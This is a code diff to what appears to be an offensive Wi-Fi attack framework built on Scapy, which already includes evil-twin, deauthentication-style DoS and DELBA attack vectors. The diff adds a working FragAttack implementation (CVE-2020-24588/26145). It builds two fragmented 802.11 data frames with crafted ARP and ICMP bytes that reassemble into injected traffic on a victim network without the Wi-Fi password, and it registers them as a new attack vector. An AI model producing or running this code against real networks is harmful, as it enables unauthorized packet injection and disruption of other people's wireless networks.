@@ -270,6 +270,7 @@ class AttackVector(Enum):
     EVIL_TWIN = "Evil Twin Handoff"
     TKIP_MIC = "TKIP/GCMP MIC Error"
     POWER_SAVE = "Power Save DoS"
+    FRAGATTACK = "FragAttack Injection"
 
 class AttackMode(Enum):
     STEALTH = 1
@@ -473,7 +474,7 @@ class RadioTapEngine:
                Dot11Elt(ID="SSID", info=ssid_b) /
                Dot11EltCSA(new_channel=new_ch, channel_switch_count=0))
         return pkt
-    
+
     @staticmethod
     def make_auth_frame(radiotap, bssid, client, seq_num=1):
         """Build authentication frame for auth table DoS.
@@ -504,6 +505,74 @@ class RadioTapEngine:
                Dot11(type=0, subtype=13,
                      addr1=client, addr2=bssid, addr3=bssid) /
                Raw(delba_body))
+        return pkt
+
+    @staticmethod
+    def make_frag_setup(radiotap, bssid, client, seq_num=42):
+        """Build FragAttack Fragment 0 (MoreFragments=1).
+
+        Creates a fragmented data frame with LLC/SNAP header declaring IPv4
+        and a partial ARP request payload. Fragment 1 completes the injection.
+
+        Reference: Mathy Vanhoef, 'Fragment and Forge' (USENIX 2021)
+        CVE-2020-24588 / CVE-2020-26145
+        """
+        # SC: seq_num in upper 12 bits, frag_num=0 in lower 4 bits
+        sc = (seq_num & 0x0FFF) << 4 | 0  # fragment 0
+
+        # Partial ARP request payload (first 14 bytes)
+        client_bytes = bytes.fromhex(client.replace(':', ''))
+        arp_partial = struct.pack('!HHBBH',
+            0x0001,  # Hardware type: Ethernet
+            0x0800,  # Protocol type: IPv4
+            6,       # HW addr length
+            4,       # Proto addr length
+            0x0001,  # Opcode: Request
+        ) + client_bytes  # Sender hardware address
+
+        pkt = (radiotap /
+               Dot11(type=2, subtype=0,
+                     FCfield=0x05,  # ToDS + MoreFragments
+                     addr1=bssid, addr2=client, addr3=bssid,
+                     SC=sc) /
+               LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
+               SNAP(OUI=0, code=0x0800) /
+               Raw(arp_partial))
+        return pkt
+
+    @staticmethod
+    def make_frag_payload(radiotap, bssid, client, seq_num=42, payload=None):
+        """Build FragAttack Fragment 1 (final fragment, MoreFragments=0).
+
+        Carries the injected payload that completes the reassembled frame.
+        When stitched with Fragment 0 in the victim's RAM, forms a valid
+        IPv4 frame with injected content — without knowing the Wi-Fi password.
+        """
+        # Same seq_num as Fragment 0, but frag_num=1
+        sc = (seq_num & 0x0FFF) << 4 | 1  # fragment 1
+
+        if payload is None:
+            # Default: ARP completion + ICMP echo probe
+            payload = (
+                b'\xC0\xA8\x01\x64'            # Sender IP: 192.168.1.100
+                b'\xFF\xFF\xFF\xFF\xFF\xFF'      # Target HW: broadcast
+                b'\xC0\xA8\x01\x01'             # Target IP: 192.168.1.1 (gw)
+                # ICMP Echo Request marker
+                b'\x45\x00\x00\x1C'             # IPv4 ver/IHL, 28 bytes
+                b'\x00\x00\x40\x00'             # Don't Fragment
+                b'\x40\x01\x00\x00'             # TTL=64, Proto=ICMP
+                b'\xC0\xA8\x01\x64'             # Src IP
+                b'\xC0\xA8\x01\x01'             # Dst IP
+                b'\x08\x00\x00\x00'             # ICMP Echo, Code 0
+                b'\xDE\xAD\xBE\xEF'             # Identifier + Seq marker
+            )
+
+        pkt = (radiotap /
+               Dot11(type=2, subtype=0,
+                     FCfield=0x01,  # ToDS only (no MoreFrag)
+                     addr1=bssid, addr2=client, addr3=bssid,
+                     SC=sc) /
+               Raw(payload))
         return pkt
 
 
@@ -559,6 +628,13 @@ class PacketFactory:
             self.auth_pool.append(RadioTapEngine.make_auth_frame(
                 rt, t.bssid, fake_mac))
         
+        # FragAttack: paired fragments for plaintext injection
+        frag_seq = 42  # shared sequence number for fragment pairing
+        self.frag_setup = RadioTapEngine.make_frag_setup(
+            rt, t.bssid, cm, seq_num=frag_seq)
+        self.frag_payload = RadioTapEngine.make_frag_payload(
+            rt, t.bssid, cm, seq_num=frag_seq)
+        
         self.chaff_packets = []
         for _ in range(5):
             self.chaff_packets.append(self._make_chaff())
@@ -598,6 +674,7 @@ class PacketFactory:
             AttackVector.PROBE_RESPONSE_CSA: [self.probe_response],
             AttackVector.DELBA_ATTACK: [self.delba],
             AttackVector.AUTH_DOS: self.auth_pool,
+            AttackVector.FRAGATTACK: [self.frag_setup, self.frag_payload],
         }
         return mapping.get(vector, [self.csa_beacon])
 
